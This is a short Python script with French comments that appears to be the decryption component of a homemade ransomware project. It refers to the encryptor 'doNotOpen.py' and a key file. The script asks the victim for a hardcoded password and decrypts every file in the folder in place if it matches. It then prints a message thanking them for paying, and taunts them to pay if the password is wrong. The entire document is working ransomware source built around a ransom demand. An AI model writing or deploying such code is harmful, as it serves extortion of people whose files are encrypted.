import os
from cryptography.fernet import Fernet


#On a besoin d'un mot de passe pour decrypter
mdp = "iwantmydata"
#Ce que doit trouver l'utilisateur
mdp_input = input("Entrez le mot de passe pour décrypter vos données\n") 
#Le mdp que l'utilisateur entre

#Tout ceci est utilisé un peu plus tard dans le code




fichiers = []


for file in os.listdir(): #crée une liste de fichiers à crypter
	if file == "doNotOpen.py" or file == "theKey.key" or file =="decrypt.py":
		continue
 #A modifier si on crypte le ransomware ou la clé par erreur 
	if os.path.isfile(file):     #On veut crypter  uniquement les fichiers
		fichiers.append(file)



with open("theKey.key", "rb") as key:
	cleSecrete = key.read()     
#On recupere la clé dans cleSecrete



if mdp == mdp_input:
	for file in fichiers:
		with open(file,"rb") as theFile:   #rb = read
			data = theFile.read()   # Save le contenu du fichier dans "data"
		data_decrypted = Fernet(cleSecrete).decrypt(data) #Permet de DEcrypter data avec la clé
		with open(file,"wb") as theFile:		# wb = write
			theFile.write(data_decrypted)
  #La dernire ligne remplace le contenue du fichier  par data_decrypted
	print("Merci d'avoir payé, vos fichiers sont maintenant décrypté")
else:
	print("Merci de payer, espece de rat :)")
